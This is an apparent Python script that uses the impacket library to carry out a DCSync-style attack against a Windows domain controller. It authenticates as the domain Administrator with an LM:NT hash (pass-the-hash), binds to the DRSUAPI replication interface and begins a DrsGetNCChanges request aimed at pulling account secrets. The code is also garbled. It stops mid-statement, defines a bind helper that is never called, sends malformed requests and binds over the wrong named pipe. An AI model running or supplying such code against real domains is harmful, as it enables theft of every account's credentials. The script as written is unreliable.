#!/usr/bin/env python3
import sys, binascii, datetime
from impacket.dcerpc.v5 import drsuapi
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5.transport import DCERPCTransportFactory
from impacket import ntlm

TARGET = '<DC_IP>'
USER   = 'legacy.corp\\Administrator'
PASS   = '<HASH>:<HASH>'  # LM:NT
DOMAIN = 'legacy.corp'

def connect():
    rpc = DCERPCTransportFactory(r'ncacn_np:%s[\pipe\lsarpc]' % TARGET)
    rpc.set_credentials(USER, '', PASS, domain=DOMAIN)
    rpc.set_kerberos(False)
    dce = rpc.get_dce_rpc()
    dce.connect()
    dce.bind(drsuapi.MSRPC_UUID_DRSUAPI)
    return dce

def drs_bind(dce):
    req = drsuapi.DrsBind()
    req['pwszDsa'] = str(dce.get_peer_hostname())
    req['pdsgo']['fExtSupp'] = 0
    # minimal bind info
    bind_info = drsuapi.DS_BIND_INFO()
    bind_info['USN'] = 0
    bind_info['Flags'] = 0
    bind_info['Guid'] = "\x00"*16
    bind_info['SupportedExtensions'] = 0
    req['pdsgo']['ExtCaps'] = drsuapi.DRS_EXTENSIONS_INT()
    # impacket can build it
    return dce.request(req, drsuapi.MSRPC_DRSBIND)[0]['pdsg']['pdsaGuidB'] or dce

def main():
    dce = connect()
    try:
        resp = dce.request(drsuapi.DrsBind())
        bind_guid = resp['pdsg']['pdsaGuidB']
        print("[+] DrsBind OK, GUID:", binascii.hexlify(bind_guid).decode()[-8:])
    except Exception as e:
        print("[-] DrsBind error:", e)
        return
    # Get domain GUID + NC
    req = drsuapi.DrsGetNCChanges()
    req['u']

main()